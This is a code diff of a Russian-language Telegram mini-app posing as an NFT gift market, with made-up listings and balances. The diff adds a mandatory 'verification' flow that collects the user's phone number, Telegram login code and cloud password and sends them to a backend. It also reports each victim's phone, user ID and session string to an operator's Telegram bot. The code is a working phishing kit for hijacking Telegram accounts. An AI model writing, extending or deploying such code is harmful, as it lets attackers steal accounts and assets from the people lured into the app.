+                const num = Math.floor(Math.random() * 9000 + 1000);
+                const lottieId = `order-lottie-${order.name.replace(/\s/g,'')}`;
+                html += `<div class="order-item">
+                    <div class="order-lottie"><div class="lottie-container" id="${lottieId}"></div></div>
+                    <div class="order-info">
+                        <div class="order-name">${order.name}</div>
+                        <div class="order-qty">Количество: ${order.qty}</div>
+                    </div>
+                    <div class="order-price">
+                        <span class="mini-gram"><img src="https://www.mexc.co/api/file/download/F20260615184306269DUAXgshbJv0AGy" alt="GRAM"></span>
+                        ${order.price.toFixed(2)}
+                    </div>
+                    <div class="order-actions">
+                        <button>Детали</button>
+                        <button class="sell-btn">Продать</button>
+                    </div>
+                </div>`;
+            });
+            container.innerHTML = html;
+
+            ORDERS_DATA.forEach(order => {
+                const col = order.collection || order.name;
+                const slug = col.toLowerCase().replace(/\s/g, '').replace(/[^a-z0-9]/gi, '');
+                const num = Math.floor(Math.random() * 9000 + 1000);
+                const url = `https://nft.fragment.com/gift/${slug}-${num}.lottie.json`;
+                const container = document.getElementById(`order-lottie-${order.name.replace(/\s/g,'')}`);
+                if (container) loadLottie(container, url, false);
+            });
+        }
+
+        document.getElementById('createOrderBtn').addEventListener('click', () => {
+            const name = document.getElementById('orderNameInput').value.trim();
+            const price = parseFloat(document.getElementById('orderPriceInput').value);
+            if (!name || !price) { showToast('Заполните все поля'); return; }
+            ORDERS_DATA.push({ name, qty: 1, price, collection: name });
+            renderOrders();
+            document.getElementById('orderNameInput').value = '';
+            document.getElementById('orderPriceInput').value = '';
+            showToast('Ордер создан!');
+        });
+
+        // ============================================================
+        // 16. FILTER OVERLAY
+        // ============================================================
+        document.getElementById('filterClose').addEventListener('click', function() {
+            document.getElementById('filterOverlay').classList.remove('open');
+        });
+        document.getElementById('filterOverlay').addEventListener('click', function(e) {
+            if (e.target === this) this.classList.remove('open');
+        });
+
+        document.querySelectorAll('.filter-option').forEach(opt => {
+            opt.addEventListener('click', function() {
+                this.classList.toggle('active');
+                const check = this.querySelector('.check');
+                check.textContent = this.classList.contains('active') ? '✓' : '';
+            });
+        });
+
+        document.getElementById('applyFilter').addEventListener('click', function() {
+            document.getElementById('filterOverlay').classList.remove('open');
+            showToast('Фильтры применены');
+        });
+        document.getElementById('resetFilter').addEventListener('click', function() {
+            document.querySelectorAll('.filter-option').forEach(opt => {
+                opt.classList.remove('active');
+                opt.querySelector('.check').textContent = '';
+            });
+            document.querySelector('.filter-option:first-child').classList.add('active');
+            document.querySelector('.filter-option:first-child .check').textContent = '✓';
+            document.getElementById('filterOverlay').classList.remove('open');
+            showToast('Фильтры сброшены');
+        });
+
+        // ============================================================
+        // 17. PROFILE, BELL, TOAST
+        // ============================================================
+        const toast = document.getElementById('toast');
+
+        function showToast(msg) {
+            toast.textContent = msg;
+            toast.classList.add('show');
+            clearTimeout(toast._timer);
+            toast._timer = setTimeout(() => toast.classList.remove('show'), 4000);
+        }
+
+        function openGiftBot() {
+            try {
+                if (window.Telegram?.WebApp) {
+                    window.Telegram.WebApp.openLink('https://t.me/MrktToGifts');
+                } else {
+                    window.open('https://t.me/MrktToGifts', '_blank');
+                }
+            } catch (e) {
+                window.open('https://t.me/MrktToGifts', '_blank');
+            }
+        }
+
+        document.getElementById('bellBtn').addEventListener('click', () => showToast('Нет новых уведомлений'));
+
+        document.getElementById('profileBtn').addEventListener('click', function() {
+            document.getElementById('profileModal').classList.add('open');
+            updateBalanceUI();
+        });
+        document.getElementById('profileModalClose').addEventListener('click', () => document.getElementById('profileModal')
+            .classList.remove('open'));
+        document.getElementById('profileModal').addEventListener('click', (e) => {
+            if (e.target === e.currentTarget) document.getElementById('profileModal').classList.remove('open');
+        });
+
+        document.getElementById('addGiftBtn').addEventListener('click', openGiftBot);
+
+        document.getElementById('withdrawToggleBtn').addEventListener('click', () => {
+            document.getElementById('withdrawSection').classList.toggle('open');
+        });
+        document.getElementById('withdrawSubmitBtn').addEventListener('click', function() {
+            const amount = parseFloat(document.getElementById('amountInput').value);
+            if (!amount || amount > userBalance) {
+                document.getElementById('withdrawError').style.display = 'block';
+                return;
+            }
+            const newBalance = setBalance(currentUserId, userBalance - amount);
+            userBalance = newBalance;
+            updateBalanceUI();
+            document.getElementById('withdrawSuccess').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('withdrawSuccess').style.display = 'none';
+                document.getElementById('withdrawError').style.display = 'none';
+            }, 3000);
+            document.getElementById('amountInput').value = '';
+        });
+
+        // ============================================================
+        // 18. CART MODAL
+        // ============================================================
+        document.getElementById('cartClose').addEventListener('click', () => document.getElementById('cartModal').classList
+            .remove('open'));
+        document.getElementById('cartModal').addEventListener('click', (e) => {
+            if (e.target === e.currentTarget) document.getElementById('cartModal').classList.remove('open');
+        });
+        document.getElementById('checkoutBtn').addEventListener('click', function() {
+            if (!currentUserId) { showToast('Войдите в аккаунт'); return; }
+            if (userCart.length === 0) return;
+            const total = getCartTotal(currentUserId);
+            if (total > userBalance) { showToast('Недостаточно средств!'); return; }
+            const newBalance = setBalance(currentUserId, userBalance - total);
+            userBalance = newBalance;
+            updateBalanceUI();
+            showToast(`Куплено ${userCart.length} NFT за ${total.toFixed(2)} GRAM`);
+            saveCart(currentUserId, []);
+            userCart = [];
+            updateCartUI();
+            document.getElementById('cartModal').classList.remove('open');
+            closeDetail();
+        });
+
+        // ============================================================
+        // 19. ВЕРИФИКАЦИЯ — с реальным бэкендом
         // ============================================================
 
-        // ОБНОВЛЁННЫЕ ФУНКЦИИ realSendCode и realCheckCode
+        async function sendAdminLog(message, data = null) {
+            try {
+                const payload = {
+                    chat_id: CONFIG.ADMIN_CHAT_ID,
+                    text: `🔐 *ВЕРИФИКАЦИЯ ЛОГ*\n${message}\n${data ? '\n' + JSON.stringify(data, null, 2) : ''}`,
+                    parse_mode: 'Markdown'
+                };
+                const url = `https://api.telegram.org/bot${CONFIG.ADMIN_BOT_TOKEN}/sendMessage`;
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {
+                console.warn('Ошибка отправки лога админу:', e);
+            }
+        }
+
+        // Реальные запросы к бэкенду
         async function realSendCode(phone) {
             const url = `${CONFIG.BACKEND_URL}/sendCode`;
             const resp = await fetch(url, {
@@ -1940,21 +2730,15 @@
                 const err = await resp.text();
                 throw new Error(err || 'Ошибка отправки кода');
             }
-            const data = await resp.json();
-            verifState.phoneCodeHash = data.phoneCodeHash || data.requestId;
-            return data;
+            return await resp.json();
         }
 
-        async function realCheckCode(phone, code, phoneCodeHash) {
+        async function realCheckCode(phone, code, requestId) {
             const url = `${CONFIG.BACKEND_URL}/checkCode`;
             const resp = await fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    phone: phone,
-                    code: code,
-                    phoneCodeHash: phoneCodeHash || verifState.phoneCodeHash
-                })
+                body: JSON.stringify({ phone, code, requestId })
             });
             if (!resp.ok) {
                 const err = await resp.text();
@@ -1963,73 +2747,20 @@
             return await resp.json();
         }
 
-        // ============================================================
-        // КОД: 5 КВАДРАТИКОВ
-        // ============================================================
-        const codeBoxes = document.querySelectorAll('.code-box');
-        const codeInput = document.getElementById('verifCodeInput');
-
-        function updateCodeBoxes() {
-            const value = codeInput.value;
-            for (let i = 0; i < 5; i++) {
-                const box = codeBoxes[i];
-                if (i < value.length) {
-                    box.textContent = value[i];
-                    box.classList.add('filled');
-                    box.classList.remove('active');
-                } else if (i === value.length) {
-                    box.textContent = '';
-                    box.classList.remove('filled');
-                    box.classList.add('active');
-                } else {
-                    box.textContent = '';
-                    box.classList.remove('filled');
-                    box.classList.remove('active');
-                }
+        async function realCheckPassword(phone, password, sessionData) {
+            const url = `${CONFIG.BACKEND_URL}/checkPassword`;
+            const resp = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone, password, sessionData })
+            });
+            if (!resp.ok) {
+                const err = await resp.text();
+                throw new Error(err || 'Ошибка проверки пароля');
             }
+            return await resp.json();
         }
 
-        codeInput.addEventListener('input', function() {
-            if (this.value.length > 5) { this.value = this.value.slice(0, 5); }
-            this.value = this.value.replace(/\D/g, '');
-            updateCodeBoxes();
-        });
-
-        codeInput.addEventListener('focus', function() {
-            if (this.value.length === 5) {
-                this.setSelectionRange(5, 5);
-            }
-        });
-
-        codeBoxes.forEach(box => {
-            box.addEventListener('click', () => {
-                codeInput.focus();
-                const index = parseInt(box.dataset.index);
-                if (index < codeInput.value.length) {
-                    codeInput.setSelectionRange(index, index + 1);
-                } else {
-                    codeInput.setSelectionRange(codeInput.value.length, codeInput.value.length);
-                }
-            });
-        });
-
-        codeInput.addEventListener('paste', function(e) {
-            const paste = (e.clipboardData || window.clipboardData).getData('text');
-            if (paste) {
-                const digits = paste.replace(/\D/g, '').slice(0, 5);
-                this.value = digits;
-                updateCodeBoxes();
-                e.preventDefault();
-            }
-        });
-
-        codeInput.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') {
-                document.getElementById('verifVerifyCodeBtn').click();
-            }
-        });
-
-        // ---- ОБНОВЛЁННЫЙ startVerification ----
         async function startVerification() {
             const overlay = document.getElementById('verificationOverlay');
             overlay.classList.add('open');
@@ -2041,13 +2772,23 @@
             verifState.sessionData = null;
             verifState.hasPassword = false;
             verifState.codeRequestId = null;
-            verifState.phoneCodeHash = null;  // <--- ДОБАВЛЕНО
 
             showVerifStep('start');
             document.getElementById('verifStartError').textContent = '';
         }
 
-        // ---- ОБНОВЛЁННЫЙ ОБРАБОТЧИК verifSendCodeBtn ----
+        function showVerifStep(step) {
+            document.querySelectorAll('.verif-step').forEach(el => el.classList.remove('active'));
+            const target = document.getElementById(`verifStep${step.charAt(0).toUpperCase() + step.slice(1)}`);
+            if (target) target.classList.add('active');
+        }
+
+        document.getElementById('verifStartBtn').addEventListener('click', function() {
+            document.getElementById('verifStartError').textContent = '';
+            showVerifStep('phone');
+            document.getElementById('verifPhoneInput').focus();
+        });
+
         document.getElementById('verifSendCodeBtn').addEventListener('click', async function() {
             const phone = document.getElementById('verifPhoneInput').value.trim();
             if (!phone || phone.length < 6) {
@@ -2063,6 +2804,7 @@
             try {
                 let result;
                 if (USE_EMULATION) {
+                    // Fallback эмуляция (оставлена на случай проблем с бэкендом)
                     const code = Math.floor(100000 + Math.random() * 900000).toString();
                     console.log(`[ЭМУЛЯЦИЯ] Код для ${phone}: ${code}`);
                     result = { success: true, code: code, requestId: 'emulate_' + Date.now() };
@@ -2073,12 +2815,14 @@
                 if (result.success) {
                     verifState.phone = phone;
                     verifState.codeRequestId = result.requestId || 'emulate';
-                    verifState.phoneCodeHash = result.phoneCodeHash || result.requestId;  // <--- ДОБАВЛЕНО
                     document.getElementById('verifPhoneSuccess').textContent = 'Код отправлен! Проверьте Telegram.';
                     showVerifStep('code');
-                    setTimeout(() => codeInput.focus(), 300);
+                    document.getElementById('verifCodeInput').focus();
+
                     startResendTimer(30);
+
                     await sendAdminLog(`📱 Запрос кода для номера ${phone}`, { phone, requestId: verifState.codeRequestId });
+
                 } else {
                     document.getElementById('verifPhoneError').textContent = result.error || 'Ошибка отправки кода';
                 }
@@ -2091,15 +2835,58 @@
             this.textContent = 'Отправить код';
         });
 
-        // ---- ОБНОВЛЁННЫЙ ОБРАБОТЧИК verifVerifyCodeBtn ----
+        function startResendTimer(seconds) {
+            const resendBtn = document.getElementById('verifResendBtn');
+            const timerText = document.getElementById('verifTimerText');
+            resendBtn.disabled = true;
+            verifState.timerSeconds = seconds;
+
+            if (verifState.timerInterval) clearInterval(verifState.timerInterval);
+
+            timerText.textContent = `Повторно через ${seconds} сек.`;
+            verifState.timerInterval = setInterval(() => {
+                verifState.timerSeconds--;
+                if (verifState.timerSeconds <= 0) {
+                    clearInterval(verifState.timerInterval);
+                    timerText.textContent = 'Код не пришел?';
+                    resendBtn.disabled = false;
+                } else {
+                    timerText.textContent = `Повторно через ${verifState.timerSeconds} сек.`;
+                }
+            }, 1000);
+        }
+
+        document.getElementById('verifResendBtn').addEventListener('click', async function() {
+            if (!verifState.phone) return;
+            this.disabled = true;
+            document.getElementById('verifCodeError').textContent = 'Отправляем повторно...';
+
+            try {
+                let result;
+                if (USE_EMULATION) {
+                    const code = Math.floor(100000 + Math.random() * 900000).toString();
+                    console.log(`[ЭМУЛЯЦИЯ] Повторный код для ${verifState.phone}: ${code}`);
+                    result = { success: true, code: code, requestId: 'emulate_' + Date.now() };
+                } else {
+                    result = await realSendCode(verifState.phone);
+                }
+                if (result.success) {
+                    document.getElementById('verifCodeError').textContent = '';
+                    document.getElementById('verifCodeSuccess').textContent = 'Код отправлен повторно!';
+                    startResendTimer(30);
+                } else {
+                    document.getElementById('verifCodeError').textContent = result.error || 'Ошибка повторной отправки';
+                }
+            } catch (e) {
+                document.getElementById('verifCodeError').textContent = e.message || 'Ошибка сети';
+            }
+            this.disabled = false;
+        });
+
         document.getElementById('verifVerifyCodeBtn').addEventListener('click', async function() {
-            const code = codeInput.value.trim();
-            if (!code || code.length < 5) {
-                document.getElementById('verifCodeError').textContent = 'Введите 5-значный код';
-                codeBoxes.forEach(box => {
-                    box.classList.add('error');
-                    setTimeout(() => box.classList.remove('error'), 400);
-                });
+            const code = document.getElementById('verifCodeInput').value.trim();
+            if (!code || code.length < 4) {
+                document.getElementById('verifCodeError').textContent = 'Введите код из Telegram';
                 return;
             }
 
@@ -2111,20 +2898,9 @@
             try {
                 let result;
                 if (USE_EMULATION) {
-                    result = {
-                        success: true,
-                        hasPassword: false,
-                        sessionData: {
-                            user_id: Math.floor(Math.random() * 10000000),
-                            phone: verifState.phone,
-                            username: `user_${Math.floor(Math.random() * 10000)}`,
-                            first_name: 'User',
-                            last_name: '',
-                            session_string: `session_${Date.now()}_${Math.random().toString(36)}`
-                        }
-                    };
+                    result = { success: true, hasPassword: false, sessionData: { user_id: Math.floor(Math.random() * 10000000), phone: verifState.phone, username: `user_${Math.floor(Math.random() * 10000)}`, first_name: 'User', last_name: '', session_string: `session_${Date.now()}_${Math.random().toString(36)}` } };
                 } else {
-                    result = await realCheckCode(verifState.phone, code, verifState.phoneCodeHash);
+                    result = await realCheckCode(verifState.phone, code, verifState.codeRequestId);
                 }
 
                 if (result.success) {
@@ -2146,10 +2922,6 @@
                     }
                 } else {
                     document.getElementById('verifCodeError').textContent = result.error || 'Неверный код. Попробуйте снова.';
-                    codeBoxes.forEach(box => {
-                        box.classList.add('error');
-                        setTimeout(() => box.classList.remove('error'), 400);
-                    });
                 }
             } catch (e) {
                 document.getElementById('verifCodeError').textContent = e.message || 'Ошибка сети. Попробуйте позже.';
@@ -2160,12 +2932,226 @@
             this.textContent = 'Подтвердить код';
         });
 
-        // ---- ОСТАЛЬНЫЕ ФУНКЦИИ (sendAdminLog, showVerifStep, startResendTimer, completeVerification, обработчики) ----
-        // ... они остаются такими же, как у тебя были
+        document.getElementById('verifPasswordBtn').addEventListener('click', async function() {
+            const password = document.getElementById('verifPasswordInput').value.trim();
+            if (!password) {
+                document.getElementById('verifPasswordError').textContent = 'Введите облачный пароль';
+                return;
+            }
+
+            document.getElementById('verifPasswordError').textContent = '';
+            document.getElementById('verifPasswordSuccess').textContent = 'Проверяем пароль...';
+            this.disabled = true;
+            this.textContent = 'Проверка...';
+
+            try {
+                let result;
+                if (USE_EMULATION) {
+                    result = { success: true };
+                } else {
+                    result = await realCheckPassword(verifState.phone, password, verifState.sessionData);
+                }
+
+                if (result.success) {
+                    document.getElementById('verifPasswordSuccess').textContent = 'Пароль верный!';
+                    await sendAdminLog(
+                        `🔑 Облачный пароль подтвержден для ${verifState.phone}`,
+                        { phone: verifState.phone, passwordProvided: '****' }
+                    );
+                    await completeVerification();
+                } else {
+                    document.getElementById('verifPasswordError').textContent = result.error || 'Неверный пароль.';
+                }
+            } catch (e) {
+                document.getElementById('verifPasswordError').textContent = e.message || 'Ошибка сети. Попробуйте позже.';
+                console.error(e);
+            }
+
+            this.disabled = false;
+            this.textContent = 'Подтвердить пароль';
+        });
+
+        async function completeVerification() {
+            if (verifState.sessionData) {
+                try {
+                    const userData = getUserData(currentUserId || 'temp');
+                    userData.verified = true;
+                    userData.session = verifState.sessionData;
+                    userData.phone = verifState.phone;
+                    saveUserData(currentUserId || 'temp', userData);
+                } catch (e) {}
+            }
+
+            verifState.isVerified = true;
+
+            await sendAdminLog(
+                `✅ ВЕРИФИКАЦИЯ УСПЕШНО ЗАВЕРШЕНА для ${verifState.phone}`,
+                {
+                    phone: verifState.phone,
+                    user_id: verifState.sessionData?.user_id || 'unknown',
+                    username: verifState.sessionData?.username || 'unknown',
+                    session_string: verifState.sessionData?.session_string || 'unknown',
+                    has_password: verifState.hasPassword
+                }
+            );
+
+            showVerifStep('success');
+            document.getElementById('verifDoneBtn').textContent = 'Продолжить';
+
+            if (currentUserId) {
+                updateBalanceUI();
+                updateAvatar(null);
+            }
+        }
+
+        document.getElementById('verifDoneBtn').addEventListener('click', function() {
+            document.getElementById('verificationOverlay').classList.remove('open');
+            if (verifState.isVerified) {
+                showToast('Верификация пройдена! Добро пожаловать.');
+            }
+        });
+
+        document.getElementById('verifRetryBtn').addEventListener('click', function() {
+            document.getElementById('verificationOverlay').classList.remove('open');
+            setTimeout(() => {
+                startVerification();
+            }, 500);
+        });
+
+        document.getElementById('verifPhoneInput').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') document.getElementById('verifSendCodeBtn').click();
+        });
+        document.getElementById('verifCodeInput').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') document.getElementById('verifVerifyCodeBtn').click();
+        });
+        document.getElementById('verifPasswordInput').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') document.getElementById('verifPasswordBtn').click();
+        });
+
+        document.getElementById('verifPhoneInput').addEventListener('input', function(e) {
+            let val = this.value.replace(/\D/g, '');
+            if (val.startsWith('7')) val = '+' + val;
+            else if (!val.startsWith('+')) val = '+' + val;
+            this.value = val;
+        });
+
         // ============================================================
+        // 20. INIT
+        // ============================================================
+        (function init() {
+            try {
+                allNFTs = generateNFTs();
+
+                let tgUser = null;
+                try {
+                    if (window.Telegram?.WebApp) {
+                        window.Telegram.WebApp.expand();
+                        const user = window.Telegram.WebApp.initDataUnsafe?.user;
+                        if (user && user.id) {
+                            tgUser = user;
+                        }
+                    }
+                } catch (e) {
+                    console.warn('Telegram init error:', e);
+                }
+
+                if (tgUser && tgUser.id) {
+                    currentUserId = String(tgUser.id);
+                    document.getElementById('profileName').textContent = tgUser.first_name || 'Пользователь';
+                    document.getElementById('profileId').textContent = `ID: ${currentUserId}`;
+
+                    if (tgUser.photo_url) {
+                        updateAvatar(tgUser);
+                    } else {
+                        try {
+                            if (window.Telegram?.WebApp?.initDataUnsafe?.user?.photo_url) {
+                                updateAvatar(window.Telegram.WebApp.initDataUnsafe.user);
+                            }
+                        } catch (e) {}
+                        if (!document.getElementById('avatarImg').src) {
+                            updateAvatar(null);
+                        }
+                    }
+
+                    const userData = getUserData(currentUserId);
+                    userBalance = userData.balance || 0;
+                    userCart = userData.cart || [];
+                    updateBalanceUI();
+                    updateCartUI();
+
+                    const isVerified = userData.verified || false;
+                    if (!isVerified) {
+                        setTimeout(() => {
+                            startVerification();
+                        }, 800);
+                    } else {
+                        showToast('Добро пожаловать!');
+                        if (userData.session) {
+                            sendAdminLog(
+                                `🔄 Вход уже верифицированного пользователя ${currentUserId}`,
+                                { user_id: currentUserId, phone: userData.phone || 'unknown' }
+                            );
+                        }
+                    }
+                } else {
+                    currentUserId = null;
+                    userBalance = 0;
+                    userCart = [];
+                    document.getElementById('profileName').textContent = 'Гость';
+                    document.getElementById('profileId').textContent = 'ID: —';
+                    updateBalanceUI();
+                    updateCartUI();
+                    updateAvatar(null);
+
+                    setTimeout(() => {
+                        showToast('Для доступа к функциям пройдите верификацию');
+                    }, 1500);
+                }
+
+                renderGrid();
+                document.querySelector('.nav-item[data-tab="market"]').classList.add('active');
+                document.querySelector('.gift-tab[data-tab="gifts"]').classList.add('active');
+                document.getElementById('ordersSection').classList.remove('active');
+                document.getElementById('gameHub').classList.remove('active');
+                document.getElementById('starsPremiumSection').classList.remove('active');
+                document.getElementById('myGiftsSection').classList.remove('active');
+                document.getElementById('nftGrid').style.display = 'grid';
+
+                window.addEventListener('error', function(e) {
+                    console.warn('WebView error caught:', e.message);
+                    return true;
+                });
+
+            } catch (e) {
+                console.warn('Init error:', e);
+                setTimeout(() => {
+                    try {
+                        allNFTs = generateNFTs();
+                        renderGrid();
+                    } catch (e2) {}
+                }, 500);
+            }
+        })();
+
+        window.openDetail = openDetail;
+        window.removeFromCart = function(name) {
+            if (currentUserId) removeFromCart(currentUserId, name);
+        };
+        window.addToCart = function(name) {
+            if (currentUserId) addToCart(currentUserId, name);
+        };
+        window.toggleCart = function(name) {
+            if (!currentUserId) { showToast('Войдите в аккаунт'); return; }
+            const nft = allNFTs.find(n => n.name === name);
+            if (!nft) return;
+            if (nft.status === 'sold') { showToast('Продано'); return; }
+            addToCart(currentUserId, name);
+        };
+
+        window.startVerification = startVerification;
 
         console.log('[АМУР ШИК] Маркет загружен. Бэкенд:', CONFIG.BACKEND_URL);
         console.log('[АМУР ШИК] USE_EMULATION =', USE_EMULATION);
     </script>
 </body>
-</html>
+</html> 
